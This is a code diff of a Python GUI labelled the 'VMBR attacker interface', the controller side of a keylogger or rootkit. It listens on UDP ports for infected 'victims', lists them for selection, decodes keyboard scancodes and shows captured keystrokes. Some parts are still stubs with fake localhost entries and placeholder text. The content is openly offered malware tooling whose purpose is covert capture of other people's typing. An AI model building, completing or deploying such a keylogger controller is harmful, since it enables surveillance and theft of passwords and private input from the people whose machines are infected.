@@ -1,5 +1,8 @@
 import socket
-import tkinter as tk
+import customtkinter as ctk
+import threading
+import queue
+import time
 
 codes = ("", "ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 
          '-', '=', "BKSP", "TAB", 'q', 'w', 'e', 'r', 't', 'y', 
@@ -25,17 +28,223 @@ codes = ("", "ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
          "ALT_DOWN", "ALT_PGDN", "ALT_INSERT", "ALT_DELETE", "ALT/",
          "ALT_TAB", "ALT_ENTER")
 
+SCAN_PORT = 49323
+KEYLOGS_PORT = 49324
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.bind(('', SCAN_PORT))
+
 def decode_scancodes(string):
     out = ""
     for i in string:
         out += codes[int(i)]
     return out
 
+class EntryFrame(ctk.CTkFrame):
+    def __init__(self, app, **kwargs):
+        super().__init__(app, **kwargs)
+
+        self.app = app
+
+        self.grid_columnconfigure(0, weight=1)
+        self.grid_rowconfigure(0, weight=3)
+        self.grid_rowconfigure(1, weight=1)
+        self.grid_rowconfigure(2, weight=5)
+
+        self.label = ctk.CTkLabel(self, text="HELLO", font=("Arial", 40, "bold"))
+        self.label.grid(row=0, column=0, padx=0, pady=0, sticky="s")
+
+        self.label = ctk.CTkLabel(self, text="Welcome to the VMBR attacker interface", font=("Arial", 16))
+        self.label.grid(row=1, column=0, padx=0, pady=5, sticky="n")
+
+        self.button = ctk.CTkButton(self, text="Start", command=self.button_callback, font=("Arial", 20))
+        self.button.grid(row=2, column=0, padx=0, pady=0)
+    
+    def button_callback(self):
+        self.app.start()
+
+class ScanningMachinesFrame(ctk.CTkFrame):
+    def __init__(self, app, **kwargs):
+        super().__init__(app, **kwargs)
+
+        self.app = app
+
+        self.grid_columnconfigure(0, weight=1)
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_rowconfigure(1, weight=1)
+
+        self.label = ctk.CTkLabel(self, text="Scanning for active VMs...", font=("Arial", 20))
+        self.label.grid(row=0, column=0, padx=0, pady=0, sticky="s")
+        
+        self.bar = ctk.CTkProgressBar(self, mode="determinate", determinate_speed=0.1)
+        self.bar.grid(row=1, column=0, padx=0, pady=0, sticky="n")
+        self.bar.set(0)
+        self.bar.start()
+
+        self.thread = threading.Thread(target=self.start)
+
+    
+    def start(self):
+
+        self.incoming_queue = queue.Queue()
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
+        self.stop_scanning = False
+        listening_thread = threading.Thread(target=self.scan_incoming_victims, name='victims-scanning-thread')
+        listening_thread.start()
+        
+        time.sleep(1)
+        
+        self.stop_scanning = True
+        self.bar.stop()
+        self.bar.set(1)
+
+        while listening_thread.is_alive():
+            pass
+        
+        self.app.start_choosing_window(self.incoming_queue)
+
+    def scan_incoming_victims(self):
+        sock.settimeout(1)
+        while not self.stop_scanning:
+            try:
+                message, address = sock.recvfrom(256)
+            except TimeoutError:
+                continue
+            self.incoming_queue.put((message, address))
+
+class ChooseFrame(ctk.CTkFrame):
+    def __init__(self, app: ctk.CTk, victims: queue.Queue, **kwargs):
+        super().__init__(app, **kwargs)
+
+        self.app = app
+
+        self.choosing_victim_frame = ChoosingVictimFrame(self, victims)
+        self.choosing_victim_frame.grid(row=1, column=0, padx=0, pady=0, sticky="nswe")
+        self.label = ctk.CTkLabel(self, text="Choose a victim", font=("Arial", 30))
+        self.label.grid(row=0, column=0, padx=0, pady=5, sticky="")
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_rowconfigure(1, weight=4)
+        self.grid_columnconfigure(0, weight=1)
+
+
+class ChoosingVictimFrame(ctk.CTkScrollableFrame):
+    def __init__(self, app: ctk.CTk, victims: queue.Queue, **kwargs):
+        super().__init__(app, **kwargs)
+
+        self.app = app
+
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_columnconfigure(0, weight=1)
+        self.grid_columnconfigure(1, weight=1)
+        self.grid_columnconfigure(2, weight=1)
+        self.grid_columnconfigure(3, weight=1)
+
+        victim_frames = []
+        while not victims.empty():
+            victim_frames.append(VictimFrame(self, victims.get()))
+        
+        for i, victim in enumerate(victim_frames):
+            self.grid_rowconfigure(i//4, weight=1)
+            victim.grid(row=i//4, column=i%4, padx=5, pady=5)
+        
+        
+
+
+class VictimFrame(ctk.CTkFrame):
+    def __init__(self, app: ctk.CTk, victim, **kwargs):
+
+        super().__init__(app, **kwargs)
+
+        self.app = app
+        self.victim = victim
+
+        self.grid_columnconfigure(0, weight=1)
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_rowconfigure(1, weight=1)
+        # self.grid_rowconfigure(2, weight=1)
+
+        self.label = ctk.CTkLabel(self, text=f"IP: {victim[1][0]}\nPort: {victim[1][1]}")
+        self.label.grid(row=0, column=0, padx=0, pady=0)
+
+        self.button = ctk.CTkButton(self, text="Choose", font=("Arial", 16), command=self.chosen)
+        self.button.grid(row=1, column=0, padx=0, pady=0)
+    
+    def chosen(self):
+        self.app.app.app.start_keylogging(self.victim)
+
+
+class KeyloggerFrame(ctk.CTkFrame):
+    def __init__(self, app: ctk.CTk, victim, **kwargs):
+
+        super().__init__(app, **kwargs)
+
+        self.app = app
+        self.victim = victim
+        
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_columnconfigure(0, weight=1)
+
+        self.textbox = ctk.CTkTextbox(self, font=("Arial", 16))
+        self.textbox.grid(row=0, column=0, sticky="nsew")
+        self.textbox.insert("0.0", "Some example text!\n" * 50)
+        self.textbox.configure(state="disabled")
+
+
+class App(ctk.CTk):
+    def __init__(self):
+        super().__init__()
+
+        self.title("VMBR")
+        self.geometry("600x400")
+        
+        self.grid_columnconfigure(0, weight=1)
+        self.grid_rowconfigure(0, weight=1)
+
+        self.entry_frame = EntryFrame(self, fg_color="transparent")
+        self.entry_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
+    
+    def start(self):
+        self.entry_frame.destroy()
+        self.scan_frame = ScanningMachinesFrame(self, fg_color="transparent")
+        self.scan_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
+        self.scan_frame.thread.start()
+    
+    def start_choosing_window(self, victims: queue.Queue):
+        self.scan_frame.destroy()
+        self.choose_frame = ChooseFrame(self, victims, fg_color="transparent")
+        self.choose_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
+    
+    def start_keylogging(self, victim):
+        self.choose_frame.destroy()
+        self.keylogger_frame = KeyloggerFrame(self, victim)
+        self.keylogger_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
+
+
 def main():
 
+    ctk.set_appearance_mode("dark")
+    app = App()
+    app.mainloop()
+
+
+    return
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     server_socket.bind(('', 49324))
-    
+
     print("\033[38;5;208mAttacker started. \033[3mWaiting for packets from victim...\033[0m")
 
     while True:
